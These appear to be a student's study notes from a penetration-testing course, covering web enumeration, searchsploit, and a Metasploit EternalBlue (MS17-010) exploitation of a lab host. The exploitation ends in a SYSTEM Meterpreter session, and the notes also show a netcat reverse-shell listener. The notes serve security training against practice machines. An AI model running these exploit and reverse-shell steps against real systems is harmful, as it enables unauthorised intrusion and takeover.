Link: <https://www.inlanefreight.com/>; rel=shortlink
Content-Type: text/html; charset=UTF-8
```
Another useful tool is **EyeWitness**, used to take screenshots of target web apps, fingerprint them, and identify possible default credentials

### Whatweb
Gives us information and versions of web servers. Helps automate web enumeration
```Input
whatweb 10.10.10.121
```
```Output
http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
```

## Certificates
*Another potential source of information if HTTPS is in use.* 
**SSL/TLS** certificates are another way of searching for information of a website. 
Information that can be found includes:
- Emails 
- company names
- location
- etc...
To enable a secure connect on your website, you must have a SSL/TLS certificate, so you are bound to find some stuff, even if minor. 

### Robots.txt
**Robots.txt** is a directory most websites have that **instructs search engine web crawlers such as Googlebot which resources CAN and CANNOT be accessed for indexing**
- Can be used to find sensitive websites 
- Shows allowed/disallowed entries

### Source Code 
**Source Code** is the code that makes up a web page. You can find valuable information here, especially as you learn to understand how websites work. 
- Access it by doing [CTRL + U] 
- May also contain developers comments 

## Practice Machine 

*Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag*

**Things I tried**:
1. First, I looked at the source code using [CTRL + U], I did not find anything 
2. Next, I checked if the page had anything interesting on robots.txt, I found this
	`Disallow: /admin-login-page.php`
3. I went to the directory and found it was a admin page. Now I went to the source code again and found a comment showing the `password and username`
4. I logged in and found the flag

# Public Exploits
*Once we have found what kinds of services a server is running, we want to see if they have any exploits*

## Finding Public Exploits
*One of the best ways to find exploits is by googling the service + "exploit"*
Another way to do this is by using a tool called **searchsploit**
**To Install:**
```shell-session
sudo apt install exploitdb -y
```
**To Use it:**
```Input
searchsploit openssh 7.2
```
```Output
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
*As seen above, all it takes is the keyword, and the name of the service, and it searches the internet for possible exploits to use on the many versions of a service.*

There are also websites that can help find them, some include:
- [Exploit DB](https://www.exploit-db.com) 
- [Rapid7 DB](https://www.rapid7.com/db/)
- [Vulnerability Lab](https://www.vulnerability-lab.com)
- [Intro to Web Applications](https://academy.hackthebox.com/module/details/75)
- Etc...
## Metasploit Primer
**Metasploit Framework (MSF)** is a useful took for having built-in exploits for many public vulnerabilities, providing an easy way to use them against vulnerable targets. Some of these tools include:
- Running reconnaissance scripts to enumerate remote hosts and compromised targets
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
- Many post-exploitation and pivoting tools

**How to run Metasploit**
```Input
msfconsole
```
```Output
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```
**One the console is running, you can search for exploits**
```Input
msf6 > search exploit eternalblue
```
```Output
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
<SNIP>
EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 
```
**Another search**
```Input
msf6 > use exploit/windows/smb/ms17_010_psexec
```
```Output
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
**Exploit Found!** Now you must configure the options
```Input
Module options (exploit/windows/smb/ms17_010_psexec):
```
```Output
 Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as

...SNIP...
```

If **REQUIRED** is set to YES, that means for the exploit to actually work, you must have that option properly configured.
**In the option above, there are 2 required:**
- **RHOSTS** - You must have the IP of the target
- **LHOST** - IP of the ATTACK Host, for us, it will be our tun0 interface. 
```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```
RHOSTS is set to the machine we are attacking 
LHOST is set to our machine we are attacking with 

**Before we can finally attack, we must ensure the server is vulnerable**
```Input
msf6 exploit(windows/smb/ms17_010_psexec) > check
```
```Output
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```
**While the *check* function will not always work, here it shows the website is indeed vulnerable**

**To finally run the exploit, we run this:**
```Input
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```
```Output

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159) at 2020-12-27 01:13:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 39640 created.
Channel 0 created.
Windows 7 Professional 7601 Service Pack 1
(C) Copyright 1985-2009 Microsoft Corp.

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM
```
**The exploit used was able to give us access to the machine, and now are the admin user**

## Practice Box 

*Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file.*

- nmap 
- google 
- Metasploit 


# Shells 
```shell-session
user@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
![[Pasted image 20241004085511.png]]
Link for more details: https://academy.hackthebox.com/module/77/section/725

```shell-session
nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- Now the weak machine is listening 

**Pros and cons of Reverse Shell**;
- Quick
- Reliable connection 
BUT:
- Fragile 
- Won't get access again without doing the exploit again 


## Bind
https://academy.hackthebox.com/module/77/section/725